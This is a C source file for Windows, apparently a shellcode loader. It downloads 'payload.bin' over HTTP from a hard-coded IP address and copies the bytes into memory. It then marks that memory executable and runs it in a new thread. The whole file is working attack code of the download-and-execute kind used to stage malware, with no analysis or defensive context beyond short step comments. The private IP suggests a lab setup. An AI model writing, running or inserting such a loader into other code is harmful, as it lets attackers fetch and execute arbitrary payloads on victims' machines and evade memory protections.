#include <Windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma warning(disable: 4996)
#pragma comment(lib, "wininet.lib")

int main(int argc, char** argv) {

    // 1. Network Setup: Download the payload
  
    HINTERNET hInternet = InternetOpenW(L"Loader/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        printf("InternetOpen failed: %lu\n", GetLastError());
        return 1;
    }

    // Update  IP
    HINTERNET hUrl = InternetOpenUrlW(hInternet, L"http://192.168.30.144:8000/payload.bin", NULL, 0, 0, 0);
    if (hUrl == NULL) {
        printf("InternetOpenUrl failed: %lu\n", GetLastError());
        InternetCloseHandle(hInternet);
        return 1;
    }

    // Allocate a buffer to hold the downloaded shellcode (max 1MB)
    BYTE* shellcode = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024);
    DWORD totalRead = 0;
    DWORD bytesRead = 0;

    // Read the bytes from the HTTP response
    while (InternetReadFile(hUrl, shellcode + totalRead, (1024 * 1024) - totalRead, &bytesRead) && bytesRead > 0) {
        totalRead += bytesRead;
    }

    printf("Downloaded %lu bytes\n", totalRead);

    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);

    if (totalRead == 0) {
        printf("Failed to download payload or payload is empty.\n");
        return 1;
    }

    
    // 2. Execution Logic
   
    LPVOID allocated_mem = VirtualAlloc(NULL, totalRead,
        (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);

    if (allocated_mem == NULL) {
        printf("Failed to allocate memory: %d\n", GetLastError());
        return 1;
    }

    printf("Memory Allocated at address: 0x%p\n", allocated_mem);

    RtlCopyMemory(
        allocated_mem,
        shellcode,
        totalRead
    );

    printf("shellcode is written to allocated memory!\n");
    HeapFree(GetProcessHeap(), 0, shellcode);

    // THE FIX: Mark memory as executable to prevent DEP crash
   
    DWORD oldProtect;
    if (!VirtualProtect(allocated_mem, totalRead, PAGE_EXECUTE_READ, &oldProtect)) {
        printf("VirtualProtect failed: %lu\n", GetLastError());
        return 1;
    }

    
    // 3. Create thread to execute the shellcode 

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)allocated_mem, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("failed to create thread: %d\n", GetLastError());
        return 1;
    }

    // Halt execution until created thread returns
    WaitForSingleObject(hThread, INFINITE);

    // Close handle to thread
    CloseHandle(hThread);

    // Free allocated memory
    VirtualFree(allocated_mem, 0, MEM_RELEASE);

    return 0;
}
